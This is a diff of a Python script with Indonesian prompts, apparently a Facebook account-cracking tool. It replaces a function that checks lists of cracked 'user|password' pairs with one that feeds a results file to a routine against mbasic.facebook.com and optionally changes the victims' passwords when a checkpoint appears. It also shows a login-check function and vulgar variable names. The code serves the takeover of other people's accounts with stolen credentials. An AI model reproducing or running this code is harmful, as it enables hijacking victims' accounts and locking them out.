@@ -191,8 +191,7 @@ def menu():
     elif asw == "7":
     	return gantiua()
     elif asw == "8":
-	cekopsi()
-        ubahpw()
+	cpdetect()
     elif asw == "9":
 	cekhasil()
     elif asw == "10":
@@ -396,34 +395,21 @@ def gantiua():
 
 
 ####CEK OPSI HASIL CRACK####
-def cekopsi():
-	dirs = os.listdir("CP")
-	print("")
-	for file in dirs:
-		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] CP/"+file)
-	print("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] masukan file (ex: CP/%s.txt)"%(tanggal))
-	files = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mnama file  \x1b[1;97m: \x1b[1;92m")
-	if files == "":
-		menu()
-	try:
-		buka_baju = open(files, "r").readlines()
-	except IOError:
-		exit("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] nama file %s tidak tersedia"%(files))
-	ubahpw()
-	print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses cek')
-	for memek in buka_baju:
-		kontol = memek.replace("\n","")
-		titid  = kontol.split("|")
-		print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
+def cpdetect():
+		__data=input("[?] Masukan nama file: ")
 		try:
-			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
-		except requests.exceptions.ConnectionError:
-			pass
-	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mcek akun sudah selesai\x1b[1;97m...")
-	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu ")
-	time.sleep(1)
-	menu()
-
+			_file=open("results/"+__data,"r").readlines()
+		except FileNotFoundError:
+			exit("[!] File tidak ditemukan")
+		ww=input("[?] Ubah pw ketika tap yes [y/t]: ")
+		if ww in ("y","ya"):
+			pwBar=input("[+] Masukan pw baru: ")
+			ub.append("y")
+			if len(pwBar) <= 5:
+				exit("Password harus lebih dari 6 character!")
+			else:
+				pwBaru.append(pwBar)
+		cpp.Eksekusi("https://mbasic.facebook.com",_file,"file","".join(pwBaru),"".join(ub))
 	
 def check_in(user, pasw):
 	mb = ("https://mbasic.facebook.com")
